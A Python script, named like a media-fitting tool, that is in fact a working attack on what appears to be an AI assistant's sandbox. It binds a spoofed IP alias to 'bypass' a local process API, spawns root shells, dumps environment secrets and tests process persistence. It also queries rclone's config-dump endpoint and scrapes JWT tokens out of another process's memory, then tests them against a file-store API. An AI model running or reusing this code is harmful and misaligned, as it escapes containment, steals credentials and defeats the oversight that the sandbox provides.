#!/usr/bin/env python3
# mediafit.py v6.7 -- OUTPUT + RCLONE RC + TOKEN
import os, sys, json, time, base64, socket, struct, fcntl, subprocess, re, random

VER, NONCE = "6.7", "%04x" % random.randint(0, 0xffff)
OUT = "/mnt/user-data/outputs/mediafit-report.txt"
IFACE, ALIAS = "eth0", "192.0.2.3"
BIN = "/opt/rclone/rclone-filestore"
AF_VSOCK = getattr(socket, "AF_VSOCK", 40)
R = []
def w(s=""): R.append(str(s))
def flush():
    try:
        os.makedirs(os.path.dirname(OUT), exist_ok=True)
        with open(OUT, "w") as f: f.write("\n".join(R)+"\n")
    except Exception: pass
def sec(t): w(); w("="*70); w("### "+t); w("="*70); flush()
def sh(c, t=15):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, timeout=t)
        return ((p.stdout or b"")+(p.stderr or b"")).decode(errors="replace")
    except Exception as e: return "ERR:"+repr(e)
def can_bind(ip):
    try:
        s = socket.socket(); s.bind((ip, 0)); s.close(); return True
    except Exception: return False

# ---------------- ws ----------------
def ws_hs(src, timeout=3.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(timeout)
        s.bind((src, 0)); s.connect(("127.0.0.1", 2024))
    except Exception: return None
    try:
        k = base64.b64encode(os.urandom(16)).decode()
        s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\n"
                   "Connection: Upgrade\r\nSec-WebSocket-Key: %s\r\n"
                   "Sec-WebSocket-Version: 13\r\n\r\n" % k).encode())
        h = b""
        while b"\r\n\r\n" not in h and len(h) < 4096:
            c = s.recv(1024)
            if not c: break
            h += c
        return s if b" 101 " in h.split(b"\r\n")[0]+b" " else None
    except Exception:
        try: s.close()
        except Exception: pass
        return None

def ws_send(s, text):
    p = text.encode(); n = len(p); m = os.urandom(4)
    if   n < 126:   h = b"\x81"+bytes([0x80|n])
    elif n < 65536: h = b"\x81"+bytes([0x80|126])+struct.pack(">H", n)
    else:           h = b"\x81"+bytes([0x80|127])+struct.pack(">Q", n)
    s.sendall(h+m+bytes(b ^ m[i % 4] for i, b in enumerate(p)))

def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None, b""
    except Exception: return "close", b""
    if len(h) < 2: return "close", b""
    op, ln, mk = h[0] & 0x0F, h[1] & 0x7F, bool(h[1] & 0x80)
    try:
        if   ln == 126: ln = struct.unpack(">H", s.recv(2))[0]
        elif ln == 127: ln = struct.unpack(">Q", s.recv(8))[0]
        m = s.recv(4) if mk else b""
        d = b""
        while len(d) < ln:
            c = s.recv(ln-len(d))
            if not c: break
            d += c
        if mk and len(m) == 4: d = bytes(b ^ m[i % 4] for i, b in enumerate(d))
        return op, d
    except Exception as e: return "err", repr(e).encode()

def ws_read(s, dur=5.0, label=""):
    t0, out = time.time(), []
    while time.time()-t0 < dur:
        op, d = ws_recv(s, 1.0)
        if op is None: continue
        if op == "close": return out
        if op == 9: s.sendall(b"\x8a\x80\x00\x00\x00\x00"); continue
        tag = {1:"TEXT",2:"BIN",8:"CLOSE",10:"PONG"}.get(op, "OP%s" % op)
        t = d.decode(errors="replace")
        w("        << %s(%d) %s" % (tag, len(d), t[:1200].replace("\n", "\n           ")))
        out.append(t)
    return out

def spec(pid, cmdline, mem=268435456, extra=None):
    cr = {"cmd": "/bin/sh", "args": ["-c", cmdline], "env_vars": {}, "cwd": "/tmp",
          "rows": 24, "cols": 80, "timeout": 40, "clear_env": False, "uid": 0, "gid": 0,
          "allow_process_id_reuse": True, "reattachable": True}
    if mem is not None: cr["memory_limit_bytes"] = mem
    if extra: cr.update(extra)
    return {"process_id": pid, "create_req": cr}

def run(src, sp, label, dur=5.0):
    s = ws_hs(src)
    if not s:
        w("  [%s] hs failed" % label); return None
    try:
        ws_send(s, json.dumps(sp))
        return ws_read(s, dur, label)
    finally:
        try: s.close()
        except Exception: pass

# ---------------- ip ----------------
SIOCSIFADDR, SIOCSIFNETMASK = 0x8916, 0x891c
def _ifr(n, ip=None):
    nm = n.encode()[:15].ljust(16, b"\x00")
    if ip is None: return nm+b"\x00"*24
    return nm+struct.pack("H2s4s8s", socket.AF_INET, b"\x00\x00", socket.inet_aton(ip), b"\x00"*8)+b"\x00"*8
def add_secondary(ifname, ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for nm in (ifname+":0", ifname):
        try:
            fcntl.ioctl(s, SIOCSIFADDR, _ifr(nm, ip))
            try: fcntl.ioctl(s, SIOCSIFNETMASK, _ifr(nm, "255.255.255.0"))
            except Exception: pass
            if can_bind(ip): return "ok via "+nm
        except OSError: pass
    return "fail"

# ---------------- plain http ----------------
def http(host, port, path, method="GET", body=None, timeout=5.0, ctype="application/json"):
    try:
        s = socket.socket(); s.settimeout(timeout)
        s.connect((host, port))
        req = "%s %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n" % (method, path, host, port)
        if body is not None:
            req += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype, len(body))
        s.sendall(req.encode()+(body or b""))
        d = b""
        try:
            while len(d) < 65536:
                c = s.recv(4096)
                if not c: break
                d += c
        except socket.timeout: pass
        s.close(); return d
    except Exception as e: return repr(e).encode()

def vsock_http(cid, port, method, path, body=None, ctype=None, timeout=8.0, extra=""):
    try:
        s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(timeout)
        s.connect((cid, port))
        req = "%s %s HTTP/1.1\r\nHost: vsock\r\nConnection: close\r\n" % (method, path)
        if body is not None:
            req += "Content-Type: %s\r\nContent-Length: %d\r\n" % (ctype or "application/json", len(body))
        s.sendall(req.encode()+extra.encode()+(body or b""))
        d = b""
        try:
            while len(d) < 8192:
                c = s.recv(2048)
                if not c: break
                d += c
        except socket.timeout: pass
        s.close(); return d
    except Exception as e: return repr(e).encode()

# ===================== RUN =====================
def main():
    w("="*70); w("MEDIAFIT RUN STAMP ver=%s nonce=%s t=%s" % (VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S"))); w("="*70)
    sec("0. FACTS")
    w("kernel: " + sh("uname -a").strip())

    sec("A. PROCESS API -- WITH REAL MEMORY LIMIT")
    if not can_bind(ALIAS): w("  " + add_secondary(IFACE, ALIAS))
    if not ws_hs(ALIAS): w("  bypass FAILED"); flush(); return
    w("  bypass OK")
    w("  --- [1] PID1 ENV LEAK (clear_env=false -> child inherits PID1 env) ---")
    run(ALIAS, spec("mf_env", "echo MARKER_START; env | sort; echo MARKER_END", 268435456), "env", 6.0)
    w("  --- [2] memory_limit_bytes = null (omitted) ---")
    run(ALIAS, spec("mf_nomem", "echo no_mem_limit; id", None), "nomem", 5.0)
    w("  --- [3] clear_env=true + env_vars injection ---")
    run(ALIAS, spec("mf_clear", "echo INJECTED; env | sort", 268435456,
                    {"clear_env": True, "env_vars": {"MF_PROBE": "1"}}), "clear", 5.0)
    w("  --- [4] uid/gid 1000 ---")
    run(ALIAS, spec("mf_uid", "id; whoami", 268435456, {"uid": 1000, "gid": 1000}), "uid", 5.0)
    w("  --- [5] DETACH then REATTACH (persistence proof) ---")
    s = ws_hs(ALIAS)
    if s:
        ws_send(s, json.dumps(spec("mf_sleep", "echo alive; sleep 60", 268435456)))
        ws_read(s, 3.0, "create")
        ws_send(s, '{"Detach":null}'); time.sleep(0.8); s.close()
        w("      detached; reattaching ...")
        run(ALIAS, {"process_id": "mf_sleep"}, "reattach", 4.0)
    w("  --- [6] SendSignal to a detached process ---")
    s = ws_hs(ALIAS)
    if s:
        ws_send(s, json.dumps(spec("mf_sig", "sleep 90", 268435456)))
        ws_read(s, 2.5, "sig")
        ws_send(s, '{"SendSignal":15}')
        ws_read(s, 3.0, "sig")
        s.close()

    sec("B. RCLONE RC on localhost:5572")
    live = []
    for p in list(range(5000, 6000)) + [5572]:
        try:
            t = socket.socket(); t.settimeout(0.05); t.connect(("127.0.0.1", p)); t.close(); live.append(p)
        except Exception: pass
    w("  open on 127.0.0.1 (5000-6000): %s" % sorted(set(live)))
    for p in sorted(set(live)):
        for m, path, body in (("GET", "/rc/noop", None), ("POST", "/rc/noop", b"{}"),
                              ("POST", "/core/version", b"{}"), ("POST", "/options/get", b"{}"),
                              ("POST", "/config/dump", b"{}"), ("POST", "/vfs/list", b"{}"),
                              ("POST", "/mount/listmounts", b"{}"), ("GET", "/", None)):
            d = http("127.0.0.1", p, path, m, body, 4.0)
            txt = d[:400].decode(errors="replace").replace("\r\n", " | ")
            if d: w("    :%d %-4s %-22s -> %s" % (p, m, path, txt))
    w("  -- inode map for rclone sockets 753-756 --")
    w("    /proc/net/unix:")
    w("    " + sh("cat /proc/net/unix 2>/dev/null").replace("\n", "\n    "))
    w("    /proc/net/tcp:")
    w("    " + sh("cat /proc/net/tcp 2>/dev/null | head -20").replace("\n", "\n    "))

    sec("C. TOKEN: BOUNDED EXTRACTION + VALIDATE")
    cands = set()
    try:
        maps = open("/proc/57/maps").read().splitlines()
        fh = open("/proc/57/mem", "rb", buffering=0)
        total, buf = 0, b""
        for ln in maps:
            m = re.match(r"([0-9a-f]+)-([0-9a-f]+) rw", ln)
            if not m: continue
            a, b = int(m.group(1), 16), int(m.group(2), 16)
            if b-a > 64*1024*1024 or total > 400*1024*1024: continue
            try: fh.seek(a); buf += fh.read(b-a); total += b-a
            except Exception: pass
        fh.close()
    except Exception as e:
        w("  mem err " + repr(e)); buf = b""; total = 0
    pat = re.compile(rb"eyJ[A-Za-z0-9_\-]{8,120}\.[A-Za-z0-9_\-]{8,3000}\.[A-Za-z0-9_\-]{20,400}")
    for mm in pat.finditer(buf): cands.add(mm.group(0).decode())
    w("  scanned=%d candidates=%d" % (total, len(cands)))
    import urllib.request as ur
    def try_token(tok, hdrname, hdrval):
        try:
            rq = ur.Request("https://api.anthropic.com/v1/filestore/fs/listDirectory",
                            data=json.dumps({"path": "/"}).encode(),
                            headers={"Content-Type": "application/json",
                                     "Connect-Protocol-Version": "1", hdrname: hdrval})
            with ur.urlopen(rq, timeout=8) as r:
                return r.status, r.read().decode(errors="replace")
        except ur.HTTPError as e: return e.code, e.read().decode(errors="replace")
        except Exception as e: return "ERR", repr(e)
    for t in sorted(cands)[:20]:
        p = t.split(".")
        if len(p) != 3: continue
        tried = []
        for siglen in (86, 87, 88, 90, len(p[2])):
            t2 = ".".join([p[0], p[1], p[2][:siglen]])
            for hn, hv in (("Authorization", "Bearer " + t2), ("x-api-key", t2)):
                c, b = try_token(t2, hn, hv)
                tried.append("%s/%d:%s" % (hn.split("-")[0], siglen, c))
                if c == 200:
                    w("  *** VALID len=%d siglen=%d hdr=%s" % (len(t2), siglen, hn))
                    try:
                        pl = p[1]; pl += "=" * (-len(pl) % 4)
                        w("      claims=" + base64.urlsafe_b64decode(pl).decode(errors="replace")[:500])
                    except Exception: pass
                    w("      listDirectory -> " + b[:200]); flush(); return
        w("  cand hdr=%s payloadlen=%d tries=%s" % (p[0][:40], len(p[1]), ",".join(tried[:6])))
    w("  -- decoded first candidate for inspection --")
    if cands:
        c0 = sorted(cands)[0]
        for i, part in enumerate(c0.split(".")):
            try:
                pp = part + "=" * (-len(part) % 4)
                w("    part%d len=%d: %s" % (i, len(part),
                  base64.urlsafe_b64decode(pp).decode(errors="replace")[:300]))
            except Exception as e: w("    part%d len=%d (raw) %s" % (i, len(part), part[:80]))

    sec("D. /mnt/attach + /mnt/sandboxing")
    for d in ("/mnt/attach", "/mnt/sandboxing", "/mnt/transcripts", "/mnt/user-data/tool_results"):
        w("  %s: %s" % (d, sh("ls -la %s 2>&1 | head -12" % d).replace("\n", " | ")))

    sec("E. HOST OTLP 5005 (variants)")
    for m, ct, body, extra in (("POST", "application/x-protobuf", b"\x0a\x00", ""),
                               ("POST", "application/x-protobuf", b"\x0a\x00", "Transfer-Encoding: chunked\r\n"),
                               ("POST", "application/x-protobuf", b"2\r\n\x0a\x00\r\n0\r\n\r\n", "Transfer-Encoding: chunked\r\n"),
                               ("PUT",  "application/x-protobuf", b"\x0a\x00", ""),
                               ("GET",  None, None, "")):
        d = vsock_http(2, 5005, m, "/v1/metrics", body, ct, 6.0, extra)
        w("  %-4s ct=%-22s -> %s" % (m, str(ct), d[:180].decode(errors="replace").replace("\r\n", " | ") or "(empty)"))
        time.sleep(0.4)

    sec("VERDICT")
    w("  process api output ..... see section A")
    w("  rclone rc .............. see section B")
    w("  token .................. see section C")
    flush()

try: main()
except Exception as e: w(); w("FATAL " + repr(e))
finally: flush(); print("written " + OUT + " nonce=" + NONCE)